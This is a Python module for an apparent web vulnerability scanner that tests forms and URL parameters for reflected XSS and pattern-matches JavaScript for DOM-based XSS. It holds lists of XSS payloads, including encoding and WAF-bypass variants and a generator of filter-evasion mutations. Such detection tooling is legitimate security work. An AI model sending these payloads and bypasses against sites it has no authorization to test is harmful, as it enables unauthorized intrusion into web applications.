import re
import random
import string
import logging
from urllib.parse import urlparse, parse_qs
from app.scanner.vulnerabilities.base import BaseScanner
from app.scanner.payload_manager import get_payload_manager

logger = logging.getLogger(__name__)


class XSSScanner(BaseScanner):
    """Cross-Site Scripting scanner with reflected XSS detection using
    unique markers, context-aware payloads, encoding bypass, WAF evasion,
    sanitization detection, and validation scoring."""

    # Unique marker for reliable reflection detection
    MARKER = 'xSs' + ''.join(random.choices(string.digits, k=6))

    # ── Payload categories ───────────────────────────────────────────

    def __init__(self, session=None, timeout=8, delay=0.5):
        super().__init__(session, timeout, delay)
        try:
            self.payload_manager = get_payload_manager()
            pm_payloads = self.payload_manager.get_payloads('xss', source='both')
            # Enrich BASIC_PAYLOADS with PayloadManager payloads (instance-level copy)
            existing = set(self.BASIC_PAYLOADS + self.EVENT_PAYLOADS +
                           self.ENCODING_PAYLOADS + self.ATTR_PAYLOADS +
                           self.WAF_BYPASS_PAYLOADS)
            extra = [p for p in pm_payloads if p not in existing]
            self.BASIC_PAYLOADS = list(self.BASIC_PAYLOADS) + extra
            stats = self.payload_manager.get_stats()
            count = stats['total'].get('xss', 0)
            logger.info(f'XSS: {count} payloads available ({len(extra)} new from PayloadManager)')
        except Exception as e:
            self.payload_manager = None
            logger.debug(f'PayloadManager not available: {e}')

        # AI-generated smart payloads
        try:
            smart = self._get_smart_payloads('xss')
            if smart:
                existing_set = set(self.BASIC_PAYLOADS)
                new_smart = [p for p in smart if p not in existing_set]
                self.BASIC_PAYLOADS = list(self.BASIC_PAYLOADS) + new_smart
        except Exception:
            pass

    # Basic script injection
    BASIC_PAYLOADS = [
        '<script>alert("{m}")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '"><script>alert("{m}")</script>',
        "'><script>alert('{m}')</script>",
        '</script><script>alert("{m}")</script>',
    ]

    # Event handler payloads (bypass script tag filters)
    EVENT_PAYLOADS = [
        '<img src=x onerror=alert("{m}")>',
        '<svg/onload=alert("{m}")>',
        '<body onload=alert("{m}")>',
        '<input onfocus=alert("{m}") autofocus>',
        '<marquee onstart=alert("{m}")>',
        '<details open ontoggle=alert("{m}")>',
        '<video><source onerror=alert("{m}")>',
        '<audio src=x onerror=alert("{m}")>',
        '" onfocus="alert(\'{m}\')" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onmouseover="alert(\'{m}\')" ',
        '<iframe src="javascript:alert(\'{m}\')">',
    ]

    # Encoding bypass payloads
    ENCODING_PAYLOADS = [
        '<scr<script>ipt>alert("{m}")</scr</script>ipt>',
        '<ScRiPt>alert("{m}")</ScRiPt>',
        '<SCRIPT>alert("{m}")</SCRIPT>',
        '%3Cscript%3Ealert("{m}")%3C/script%3E',
        '\\x3cscript\\x3ealert("{m}")\\x3c/script\\x3e',
        '<script>alert`{m}`</script>',
        '<img src=x onerror=alert`{m}`>',
    ]

    # Attribute breakout payloads
    ATTR_PAYLOADS = [
        '"><img src=x onerror=alert("{m}")>',
        "' onmouseover='alert(1)' x='",
        '" onmouseover="alert(1)" x="',
        '"><svg onload=alert("{m}")>',
        "javascript:alert('{m}')",
        'data:text/html,<script>alert("{m}")</script>',
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
        '" onclick="alert(1)',
    ]

    # WAF bypass payloads
    WAF_BYPASS_PAYLOADS = [
        '<svg/onload=alert("{m}")>',
        '<img src=x onerror=prompt("{m}")>',
        '<img src=x onerror=confirm("{m}")>',
        '"><img/src=`x`onerror=alert("{m}")>',
        '<svg><script>alert("{m}")</script></svg>',
        '<math><mi//xlink:href="data:x,<script>alert("{m}")</script>">',
        '{{constructor.constructor("alert(\'{m}\')")()}}',
        '<iframe srcdoc="<script>alert(\'{m}\')</script>">',
        '<img src=x onerror=alert(document.domain)>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    ]

    # JavaScript context payloads (from enhanced)
    JS_CONTEXT_PAYLOADS = [
        "';alert('{m}');//",
        '";alert("{m}");//',
        "'-alert('{m}')-'",
        '"-alert("{m}")-"',
        "</script><script>alert('{m}')</script>",
        "\\\\\';alert('{m}');//",
    ]

    # URL context payloads (from enhanced)
    URL_CONTEXT_PAYLOADS = [
        "javascript:alert('{m}')",
        "java\\nscript:alert('{m}')",
        "java\\tscript:alert('{m}')",
        "data:text/html,<script>alert('{m}')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]

    def _get_all_payloads(self):
        """Return all payloads with unique marker substituted."""
        m = self.MARKER
        all_payloads = (
            self.BASIC_PAYLOADS +
            self.EVENT_PAYLOADS +
            self.ENCODING_PAYLOADS +
            self.ATTR_PAYLOADS +
            self.WAF_BYPASS_PAYLOADS
        )
        return [p.replace('{m}', m) for p in all_payloads]

    def _check_reflected(self, response_text, payload):
        """Check if the payload is reflected in the response unencoded.
        Verifies dangerous characters are not HTML-entity-encoded."""
        if not response_text:
            return False
        # If payload contains HTML special chars, ensure they're NOT encoded
        has_html_chars = '<' in payload or '>' in payload
        if has_html_chars:
            # Check for exact unencoded payload
            if payload in response_text:
                # Verify it's not just the encoded version
                encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                if encoded_payload in response_text and payload not in response_text.replace('&lt;', '<').replace('&gt;', '>'):
                    return False  # Only encoded version found
                return True
            # Check via marker (unencoded)
            if self.MARKER in response_text:
                idx = response_text.find(self.MARKER)
                if idx >= 0:
                    context = response_text[max(0, idx-50):idx+len(self.MARKER)+50]
                    if '&lt;' not in context and '&gt;' not in context:
                        return True
            return False
        else:
            # No HTML special chars — simple presence check
            if self.MARKER in response_text:
                return True
            if payload in response_text:
                return True
            if payload.lower() in response_text.lower():
                return True
        return False

    def _check_reflection_context(self, response_text, payload):
        """Determine in what context the payload was reflected."""
        if not response_text:
            return 'none'
        idx = response_text.find(self.MARKER)
        if idx == -1:
            idx = response_text.lower().find(payload.lower())
        if idx == -1:
            return 'none'

        # Check surrounding context (100 chars before)
        before = response_text[max(0, idx - 100):idx].lower()
        if '<script' in before and '</script>' not in before:
            return 'script'
        elif re.search(r'href\s*=\s*["\']?\s*$', before):
            return 'url'
        elif re.search(r'<\w+[^>]*=\s*["\']?$', before):
            return 'attribute'
        else:
            return 'html'

    # ── Sanitization detection (merged from enhanced) ────────────────

    def _is_sanitized(self, response_text, payload):
        """Checks if the payload has been sanitized."""
        sanitized_versions = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;'),
            payload.replace("'", '&#x27;'),
            payload.replace('<script>', '').replace('</script>', ''),
            payload.replace('onerror', ''),
        ]
        for sanitized in sanitized_versions:
            if sanitized in response_text and sanitized != payload:
                return True
        return False

    # ── Validation scoring (merged from enhanced) ────────────────────

    def _validate_xss(self, payload, response_text, context):
        """Validates XSS finding with a scoring system to reduce false positives.
        Returns (is_valid, confidence_percentage)."""
        score = 0
        max_score = 5

        # Check 1: Payload is actually reflected
        if payload in response_text:
            score += 1

        # Check 2: Payload is in executable context (HTML tags intact)
        has_html = '<' in payload and '>' in payload
        if has_html and payload in response_text:
            score += 2
        elif not has_html and payload in response_text:
            score += 1

        # Check 3: No sanitization detected
        if not self._is_sanitized(response_text, payload):
            score += 1

        # Check 4: Content-Type is HTML
        if '<html' in response_text.lower() or '<!doctype' in response_text.lower():
            score += 1

        confidence = int((score / max_score) * 100)
        return score >= 3, confidence

    # ── Bypass variation generation (merged from enhanced) ───────────

    def _generate_bypass_variations(self, payload):
        """Generates filter bypass variations of a payload."""
        variations = []

        # Case manipulation
        variations.append(payload.upper())
        variations.append(''.join(
            c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)
        ))

        # Tag mutations
        if '<script>' in payload.lower():
            variations.append(payload.replace('<script>', '<ScRiPt>'))
            variations.append(payload.replace('<script>', '<script/**/>'))

        # Event handler mutations
        if 'onerror' in payload.lower():
            variations.append(payload.replace('onerror', 'OnErRoR'))
            variations.append(payload.replace('onerror=', 'onerror ='))

        # Alert syntax alternatives
        if 'alert(1)' in payload or 'alert(' in payload:
            variations.append(payload.replace('alert(1)', 'alert`1`'))
            variations.append(payload.replace('alert(1)', 'prompt(1)'))
            variations.append(payload.replace('alert(1)', 'confirm(1)'))

        return variations

    def _test_param(self, url, param_name):
        """Test a URL parameter for reflected XSS with validation."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # First, test if the parameter is reflected at all using the marker
        test_params = dict(params)
        test_params[param_name] = [self.MARKER]
        query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
        probe_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
        probe_resp = self._request('GET', probe_url)

        if not probe_resp or self.MARKER not in probe_resp.text:
            return None  # Parameter not reflected, skip payload testing

        # Parameter IS reflected — detect context
        context = self._check_reflection_context(probe_resp.text, self.MARKER)

        # Choose payloads based on context
        m = self.MARKER
        if context == 'attribute':
            payloads = [p.replace('{m}', m) for p in
                        self.ATTR_PAYLOADS + self.EVENT_PAYLOADS[:6]]
        elif context == 'script':
            payloads = [p.replace('{m}', m) for p in
                        self.JS_CONTEXT_PAYLOADS + self.BASIC_PAYLOADS[:2]]
        elif context == 'url':
            payloads = [p.replace('{m}', m) for p in
                        self.URL_CONTEXT_PAYLOADS + self.ATTR_PAYLOADS[:3]]
        else:
            payloads = self._get_all_payloads()

        for payload in payloads:
            # Also try bypass variations if basic payload fails
            all_to_test = [payload] + self._generate_bypass_variations(payload)[:3]

            for test_payload in all_to_test:
                test_params = dict(params)
                test_params[param_name] = [test_payload]
                query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                response = self._request('GET', test_url)
                if response and self._check_reflected(response.text, test_payload):
                    # Validate finding
                    is_valid, confidence = self._validate_xss(
                        test_payload, response.text, context
                    )
                    if is_valid:
                        return {
                            'vulnerable': True,
                            'payload': test_payload,
                            'url': test_url,
                            'param': param_name,
                            'context': context,
                            'confidence': confidence,
                        }
        return None

    def _test_form(self, form):
        """Test form inputs for reflected XSS with validation."""
        url = form.get('action', '')
        method = form.get('method', 'get').upper()
        inputs = form.get('inputs', [])

        testable = [inp for inp in inputs
                    if inp['type'] not in ('submit', 'button', 'hidden', 'csrf', 'image', 'reset')]

        for target_input in testable:
            # Probe: is this field reflected?
            data = {}
            for inp in inputs:
                if inp['name'] == target_input['name']:
                    data[inp['name']] = self.MARKER
                elif inp['type'] in ('submit', 'button'):
                    data[inp['name']] = inp.get('value', 'Submit')
                else:
                    data[inp['name']] = inp.get('value', '') or 'test'

            if method == 'POST':
                probe_resp = self._request('POST', url, data=data)
            else:
                probe_resp = self._request('GET', url, params=data)

            if not probe_resp or self.MARKER not in probe_resp.text:
                continue  # Field not reflected

            # Field is reflected — detect context and test payloads
            context = self._check_reflection_context(probe_resp.text, self.MARKER)
            payloads = self._get_all_payloads()

            for payload in payloads:
                data_test = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data_test[inp['name']] = payload
                    elif inp['type'] in ('submit', 'button'):
                        data_test[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data_test[inp['name']] = inp.get('value', '') or 'test'

                if method == 'POST':
                    response = self._request('POST', url, data=data_test)
                else:
                    response = self._request('GET', url, params=data_test)

                if response and self._check_reflected(response.text, payload):
                    # Validate finding
                    is_valid, confidence = self._validate_xss(
                        payload, response.text, context
                    )
                    if is_valid:
                        return {
                            'vulnerable': True,
                            'payload': payload,
                            'url': url,
                            'param': target_input['name'],
                            'method': method,
                            'context': context,
                            'confidence': confidence,
                        }
        return None

    # ── Main scan ────────────────────────────────────────────────────

    def scan(self, target_url, injectable_points):
        self.findings = []
        seen = set()

        for point in injectable_points:
            # ── Forms ──
            if isinstance(point, dict) and point.get('type') == 'form':
                result = self._test_form(point)
                if result:
                    key = f"{result['url']}:{result['param']}"
                    if key not in seen:
                        seen.add(key)
                        ctx = result.get('context', 'html')
                        confidence = result.get('confidence', 80)
                        finding = {
                            'vuln_type': 'xss',
                            'name': f'Cross-Site Scripting (XSS) — {ctx} context',
                            'description': (
                                f'The application reflects user input in a {ctx} context '
                                'without proper encoding. Attackers can inject malicious '
                                'scripts that execute in victims\' browsers.'
                            ),
                            'impact': 'Session hijacking, credential theft, keylogging, phishing, malware distribution, defacement.',
                            'severity': 'high',
                            'cvss_score': 7.2,
                            'confidence': confidence,
                            'owasp_category': 'A03',
                            'cwe': 'CWE-79',
                            'affected_url': result['url'],
                            'parameter': result['param'],
                            'payload': result['payload'],
                            'request_data': f"{result.get('method', 'POST')} {result['url']}\nParam: {result['param']}={result['payload']}",
                            'response_data': 'Payload reflected in response without encoding',
                            'remediation': (
                                'Context-aware output encoding: HTML-encode for HTML context, '
                                'JS-encode for script context, URL-encode for href attributes. '
                                'Deploy Content Security Policy (CSP). Use auto-escaping template engines.'
                            )
                        }
                        if result.get('difficulty'):
                            finding['difficulty'] = result['difficulty']
                        self.findings.append(finding)

            # ── URL parameters ──
            elif isinstance(point, dict) and 'name' in point:
                result = self._test_param(point.get('url', target_url), point['name'])
                if result:
                    key = f"{result['url']}:{result['param']}"
                    if key not in seen:
                        seen.add(key)
                        ctx = result.get('context', 'html')
                        confidence = result.get('confidence', 80)
                        finding = {
                            'vuln_type': 'xss',
                            'name': f'Reflected XSS — {ctx} context',
                            'description': (
                                f'User-supplied data in the URL parameter "{result["param"]}" '
                                f'is reflected in a {ctx} context without sanitization.'
                            ),
                            'impact': 'Session hijacking, phishing, client-side attacks, credential theft.',
                            'severity': 'high',
                            'cvss_score': 7.2,
                            'confidence': confidence,
                            'owasp_category': 'A03',
                            'cwe': 'CWE-79',
                            'affected_url': result['url'],
                            'parameter': result['param'],
                            'payload': result['payload'],
                            'request_data': f"GET {result['url']}",
                            'response_data': 'Script payload reflected in page source unencoded',
                            'remediation': (
                                'Implement context-aware output encoding. '
                                'Use Content Security Policy (CSP). '
                                'Sanitize all user input with an allowlist approach.'
                            )
                        }
                        if result.get('difficulty'):
                            finding['difficulty'] = result['difficulty']
                        self.findings.append(finding)

        return self.findings


class DOMXSSAnalyzer:
    """Analyzes JavaScript for DOM-based XSS vulnerabilities.
    Can be used by the scan manager to check inline/external JS."""

    SOURCES = [
        'document.URL',
        'document.documentURI',
        'document.baseURI',
        'location',
        'location.href',
        'location.search',
        'location.hash',
        'location.pathname',
        'document.cookie',
        'document.referrer',
        'window.name',
    ]

    SINKS = [
        'eval(',
        'setTimeout(',
        'setInterval(',
        'Function(',
        'document.write(',
        'document.writeln(',
        '.innerHTML',
        '.outerHTML',
        'insertAdjacentHTML(',
        '.setAttribute(',
    ]

    @staticmethod
    def analyze(javascript_code):
        """Analyzes JavaScript code for DOM XSS patterns.
        Returns list of vulnerability dicts."""
        vulnerabilities = []

        for source in DOMXSSAnalyzer.SOURCES:
            if source in javascript_code:
                for sink in DOMXSSAnalyzer.SINKS:
                    if DOMXSSAnalyzer._check_data_flow(javascript_code, source, sink):
                        vulnerabilities.append({
                            'vuln_type': 'xss',
                            'name': 'DOM-based XSS',
                            'severity': 'high',
                            'cvss_score': 6.1,
                            'owasp_category': 'A03',
                            'cwe': 'CWE-79',
                            'source': source,
                            'sink': sink,
                            'evidence': DOMXSSAnalyzer._extract_snippet(javascript_code, source, sink),
                            'description': f'Potential DOM XSS: data flows from {source} to {sink}',
                            'remediation': 'Sanitize user input before using in DOM sinks. Use safe APIs like textContent instead of innerHTML.',
                        })

        return vulnerabilities

    @staticmethod
    def _check_data_flow(code, source, sink):
        """Simplified data flow analysis between source and sink."""
        # Find variable assignments involving the source
        pattern = r'(\w+)\s*=\s*[^;]*' + re.escape(source)
        matches = re.findall(pattern, code)

        for var_name in matches:
            # Check if variable is used near a sink
            if var_name in code and sink in code:
                source_index = code.find(var_name + ' =')
                sink_index = code.find(sink, source_index)
                if 0 <= sink_index - source_index <= 500:
                    return True

        # Check for direct flow
        source_index = code.find(source)
        sink_index = code.find(sink, source_index)
        if 0 <= sink_index - source_index <= 200:
            return True

        return False

    @staticmethod
    def _extract_snippet(code, source, sink):
        """Extracts code snippet showing the vulnerability."""
        source_index = code.find(source)
        sink_index = code.find(sink, source_index)
        if source_index >= 0 and sink_index >= 0:
            start = max(0, source_index - 50)
            end = min(len(code), sink_index + 100)
            return code[start:end].strip()
        return ""
